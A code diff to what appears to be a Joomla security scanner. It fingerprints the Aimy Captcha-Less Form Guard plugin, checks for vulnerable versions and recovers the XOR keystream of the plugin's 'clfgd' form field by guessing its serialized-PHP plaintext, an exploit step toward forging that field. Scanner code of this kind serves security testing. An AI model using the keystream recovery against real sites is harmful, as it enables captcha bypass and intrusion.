@@ -21,6 +21,23 @@ HELIX3_PATCHED_VERSION = "3.1.2"
 HELIX3_AJAX_PATH = "/index.php?option=com_ajax&plugin=helix3&format=json"
 BAFORMS_PATCHED_VERSION = "2.4.1"
 BAFORMS_OPTION = "com_baforms"
+AIMY_FIRST_VERSION = "18.0"
+AIMY_PATCHED_VERSION = "20.1"
+AIMY_FORM_PATHS = (
+    "/index.php?option=com_users&view=registration",
+    "/index.php?option=com_users&view=login",
+    "/index.php?option=com_users&view=reset",
+    "/index.php?option=com_users&view=remind",
+    "/index.php?option=com_contact&view=contact",
+    "/index.php?option=com_content&view=article&id=1",
+    "/index.php",
+    "/",
+)
+_AIMY_VERSION_RES = (
+    re.compile(r"aimy[^\"']{0,40}ver[=:\s]+([0-9]+(?:\.[0-9]+)*)", re.I),
+    re.compile(r"captcha-less[^\"']{0,40}([0-9]+(?:\.[0-9]+)*)", re.I),
+    re.compile(r"/plugins/system/aimy[^\"']*?/([0-9]+(?:\.[0-9]+)*)/", re.I),
+)
 
 
 class Joomla(BaseModule):
@@ -79,6 +96,129 @@ class Joomla(BaseModule):
         if not version:
             return False
         return not cls.version_less_than(version, patched)
+
+    @classmethod
+    def aimy_is_patched(cls, version: str, patched: str = AIMY_PATCHED_VERSION) -> bool:
+        if not version:
+            return False
+        return not cls.version_less_than(version, patched)
+
+    @staticmethod
+    def aimy_extract_version(html: str) -> str:
+        for pattern in _AIMY_VERSION_RES:
+            match = pattern.search(html or "")
+            if match:
+                return match.group(1)
+        return ""
+
+    def aimy_version_vulnerable(self, version: str) -> Optional[bool]:
+        if not version:
+            return None
+        if self.version_less_than(version, AIMY_FIRST_VERSION):
+            return False
+        if not self.version_less_than(version, AIMY_PATCHED_VERSION):
+            return False
+        return True
+
+    def probe_aimy(self) -> Dict[str, Any]:
+        """Fingerprint Aimy Captcha-Less Form Guard from manifests and form pages."""
+        for manifest in (
+            "/plugins/system/aimycaptcha/aimycaptcha.xml",
+            "/plugins/system/aimycaptchaless/aimycaptchaless.xml",
+            "/plugins/system/aimy/aimy.xml",
+        ):
+            response = self.joomla_http_get(manifest, timeout=8)
+            if not response or response.status_code != 200:
+                continue
+            body = response.text or ""
+            if "aimy" not in body.lower() and "captcha" not in body.lower():
+                continue
+            match = self._XML_VERSION_RE.search(body)
+            version = match.group(1).strip() if match else None
+            return {"found": True, "version": version, "evidence": manifest}
+
+        found = self.aimy_find_form()
+        if found:
+            return {
+                "found": True,
+                "version": found.get("version") or None,
+                "evidence": found.get("path"),
+            }
+        return {"found": False, "version": None, "evidence": None}
+
+    def aimy_find_form(
+        self,
+        form_path: str = "",
+        timeout: Optional[float] = None,
+    ) -> Optional[Dict[str, Any]]:
+        """Return form metadata when a page exposes the Aimy ``clfgd`` field."""
+        override = str(form_path or "").strip()
+        paths = (
+            [override if override.startswith("/") else f"/{override}"]
+            if override
+            else list(AIMY_FORM_PATHS)
+        )
+        request_timeout = timeout if timeout is not None else 15
+
+        for path in paths:
+            response = self.joomla_http_get(path, timeout=request_timeout)
+            if not response or int(response.status_code or 0) != 200:
+                continue
+            html = response.text or ""
+            match = re.search(r'name="clfgd"\s+value="([^"]+)"', html) or re.search(
+                r"name='clfgd'\s+value='([^']+)'", html
+            )
+            if not match:
+                if 'name="clfgd"' not in html and "name='clfgd'" not in html:
+                    if "clfgd" not in html.lower():
+                        continue
+                return None
+            return {
+                "path": path,
+                "html": html,
+                "clfgd": match.group(1),
+                "version": self.aimy_extract_version(html),
+            }
+        return None
+
+    @staticmethod
+    def aimy_recover_keystream(html: str, clfgd_b64: str) -> Optional[bytes]:
+        try:
+            import base64
+
+            ciphertext = base64.b64decode(clfgd_b64).decode("latin-1")
+        except Exception:
+            return None
+
+        mark = re.search(r'id="([^"]*_mark)"', html)
+        if mark:
+            captcha_id = mark.group(1).replace("_mark", "")
+        else:
+            mark = re.search(
+                r"id=['\"]jform_captcha['\"]\s+name=['\"]([^'\"]+)['\"]", html, re.I
+            ) or re.search(r'name=["\'](jform_captcha)["\']', html)
+            captcha_id = mark.group(1) if mark else None
+        if not captcha_id:
+            return None
+
+        trap = re.search(
+            r'<input[^>]*name="([^"]+)"[^>]*/>\s*<input[^>]*name="clfgd"', html, re.I
+        )
+        if not trap:
+            return None
+
+        mt = int(time.time()) + 7
+        plaintext = (
+            'O:8:"stdClass":2:{'
+            f's:8:"trap_ids";a:2:{{i:0;s:{len(captcha_id)}:"{captcha_id}";'
+            f'i:1;s:{len(trap.group(1))}:"{trap.group(1)}";}}'
+            f's:2:"mt";i:{mt};}}'
+        )
+        keystream = bytes(
+            ord(ciphertext[index]) ^ ord(plaintext[index])
+            for index in range(min(len(ciphertext), len(plaintext)))
+        )
+        return keystream if len(keystream) > 30 else None
 
     @staticmethod
     def extract_csrf_token(body: str) -> Optional[str]:
